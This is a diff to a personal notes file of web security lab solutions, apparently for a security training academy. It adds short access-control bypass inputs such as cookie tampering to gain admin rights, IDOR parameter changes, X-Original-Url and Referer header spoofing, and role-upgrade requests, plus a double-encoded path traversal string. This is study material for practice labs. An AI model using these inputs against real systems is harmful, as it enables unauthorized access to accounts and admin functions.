@@ -509,6 +509,7 @@ ${ ex("rm morale.txt") }
 ## Path traversal
 ### Notes
 - `../` double url encode: `%252e%252e%252f`
+
 ### Labs
 ```sh
 # File path traversal, simple case
@@ -530,5 +531,39 @@ ${ ex("rm morale.txt") }
 ### Labs
 ```sh
 # Unprotected admin functionality
+https://0a4d005f0386d796801f6c5f006300b9.web-security-academy.net/administrator-panel
+# Unprotected admin functionality with unpredictable URL
+https://0abd000c033d1117819175a900f30048.web-security-academy.net/admin-ncwd6z
+# User role controlled by request parameter
+/admin/delete?username=carlos # (set Cookie: Admin=true)
+# User role can be modified in user profile
+{"email":"1@1.com", "roleid": 2}
+# User ID controlled by request parameter
+https://0a3c005c030c5540802235b300ec0068.web-security-academy.net/my-account?id=carlos
+# User ID controlled by request parameter, with unpredictable user IDs
+https://0a3900bc04bb40e88163a77e002200f9.web-security-academy.net/my-account?id=b7b31d17-ee3f-4dd9-8b02-7f9157d577fc
+# User ID controlled by request parameter with data leakage in redirect
+https://0ade00c60420793881fb985c00d2002d.web-security-academy.net/my-account?id=carlos
+https://0ade00c60420793881fb985c00d2002d.web-security-academy.net/login
+# User ID controlled by request parameter with password disclosure
+https://0ae5006b03d0546080ee3a42002c0033.web-security-academy.net/my-account?id=administrator
+# Insecure direct object references
+intercept traffic and modify 2.txt to 1.txt
+# URL-based access control can be circumvented
+/?username=carlos
+X-Original-Url: /admin/delete
+# Method-based access control can be circumvented
+POSTX /admin-roles?username=wiener&action=upgrade
+# Multi-step process with no access control on one step
+action=upgrade&confirmed=true&username=wiener
+# Referer-based access control
+GET /admin-roles?username=wiener&action=upgrade HTTP/
+Referer: https://0a590035045fa8b680f3f8cb00ef0050.web-security-academy.net/admin
+```
+
+## Authentication
+### Notes
+### Labs
+```sh
 
 ```
